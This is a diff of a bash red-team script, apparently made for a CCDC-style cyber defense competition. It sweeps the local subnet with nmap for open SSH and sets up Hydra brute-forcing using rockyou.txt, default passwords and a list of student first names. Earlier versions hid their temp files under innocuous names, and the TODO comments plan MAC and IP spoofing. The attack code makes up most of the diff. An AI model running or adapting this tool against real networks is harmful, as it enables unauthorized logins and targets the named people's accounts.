@@ -22,6 +22,8 @@
 	# change spectre so it checks if its on attack/cleanup (fuck/unfuck) duty. (loops)
 	# setup multiple levels of complexity of attack (ie altering sshkey file lookup locations)
 	# fix the for loop garbage in the colorizer
+	# auto change mac, send out spoofed IPs, etc
+	# leaave msgs in syslog 'logger'
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -50,9 +52,6 @@ function main(){	###
 #--------------------------------
 #### Variables ####
 attackDog=$(hostname -I)
-pwListFull="/usr/share/wordlists/rockyou.txt"
-userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
-listsDir="/usr/share/wordlists"
 ###########################################################################################
 #are you root? no? well, try again
 ###########################################################################################
@@ -62,39 +61,8 @@ function neo(){
 		printf "\nCurrent dir is "$(pwd)"\n\n"
 		exit 1
 	fi
-	}
-###########################################################################################
-# checking for files and dirs
-###########################################################################################
-function bones(){
-#checking for wordlist dir
-	if [[ ! -d $listsDir ]]; then
-		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
-		command mkdir -p "$listsDir"/metasploit
-	fi
-
-#checking for 'rockyou.txt' password list
-	if [[ ! -f "$pwListFull" ]]; then
-		printf "\n"
-	#checking for the .gz
-		if [[ -f "$pwListFull".gz ]]; then
-			printf "\nExtracting rockyou.txt\n"
-			command tar -xf "$pwListFull".gz -C "$listsDir"
-		else
-		#downloading rockyou.txt
-			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
-			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
-		fi
-	fi
-
-#checking for 'unix_users.txt'
-	if [[ ! -f "$userListUnix" ]]; then
-	#downloading unix_users list
-		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
-		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
-		printf "\n\n\n"
-	fi
 }
+
 ###########################################################################################
 # check/install/configure apps
 ###########################################################################################
@@ -133,6 +101,50 @@ function meat(){
 
 }
 ###########################################################################################
+# checking for files and dirs
+###########################################################################################
+function bones(){
+	listsDir="/usr/share/wordlists"
+	# PASSWORD LISTS
+	pwListBasic="/tmp/pwListBasic"
+	pwListFull="/usr/share/wordlists/rockyou.txt"
+		printf "P@ssw0rd\npassword\ntoor\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nqwe\nQWE\nCCDC\nccdc\n" > $pwListBasic
+		#pwListFull
+	# USERNAME LISTS
+	userListBasic="/tmp/userListBasic"
+	userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
+	userListStudents="/tmp/userListStudents"
+		printf "root\nstudent\nccdc\nname" > $userListBasic
+		printf "root\nuser\nstudent\nadam\nalex\nalexander\nandrew\nangel\nanreah\narmagetronad\nbrad\ncanyon\ncasey\ncharles\nchris\nclay\ndale\ndavid\ndoug\nevan\ngeoffrey\nhilary\nkip\nleah\nnolan\nnolan01m\nsamuel\nshane\nsmith\ntori\ntyler\nyianni\n" > $userListStudents
+#checking for wordlist dir
+	if [[ ! -d $listsDir ]]; then
+		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
+		command mkdir -p "$listsDir"/metasploit
+	fi
+
+#checking for 'rockyou.txt' password list
+	if [[ ! -f "$pwListFull" ]]; then
+		printf "\n"
+	#checking for the .gz
+		if [[ -f "$pwListFull".gz ]]; then
+			printf "\nExtracting rockyou.txt\n"
+			command tar -xf "$pwListFull".gz -C "$listsDir"
+		else
+		#downloading rockyou.txt
+			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
+			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+		fi
+	fi
+
+#checking for 'unix_users.txt'
+	if [[ ! -f "$userListUnix" ]]; then
+	#downloading unix_users list
+		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
+		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
+		printf "\n\n\n"
+	fi
+}
+###########################################################################################
 # banging down the door
 ###########################################################################################
 function brute(){
@@ -141,27 +153,17 @@ function brute(){
 		#make sure these are all tmp files
 		tmpFiles=""$hydraOutput" "$crackedLogins" "$liveHosts" "$pwListBasic" "$userListBasic""
 	# cracked info file(s)
-		hydraOutput="/tmp/initrd.img-4.15.0-38-generic"
-		crackedLogins="./logins"
+		hydraOutput="/tmp/hydraOutput"
+		crackedLogins="./crackedLogins"
 	# gathering local network ID info (hopefully)
 		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
 	# gathering live HOSTS
-		liveHosts="/tmp/zlxoiqa"
+		liveHosts="/tmp/liveHosts"
 		printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n------\n\n"
 		printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$liveHosts"
 		command sed -i "/$(hostname -I | tr -d " ")/d" "$liveHosts"
 		printf "\tTargets List:\n$(cat $liveHosts)\n"
-	# basic list of PASSWORDS
-		pwListBasic="/tmp/flfidoo"
-		printf "P@ssw0rd\npassword\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nqwe\nQWE\nCCDC\nccdc\n" > $pwListBasic
-		#pwListFull
-	# basic list of USERNAMES
-		userListBasic="/tmp/dosielsxi"
-		printf "root\nstudent\nccdc\nname" > $userListBasic
-	# student list of USERNAMES
-		userListStudents="/tmp/dkosiall"
-		printf "root\nuser\nstudent\nadam\nalex\nalexander\nandrew\nangel\nanreah\narmagetronad\nbrad\ncanyon\ncasey\ncharles\nchris\nclay\ndale\ndavid\ndoug\nevan\ngeoffrey\nhilary\nkip\nleah\nnolan\nnolan01m\nsamuel\nshane\nsmith\ntori\ntyler\nyianni\n" > $userListStudents
-		#userListUnix
+
 
 	### testing all login info for all IPs
 		#**** if hydra.restore ask if skip ****************************************************
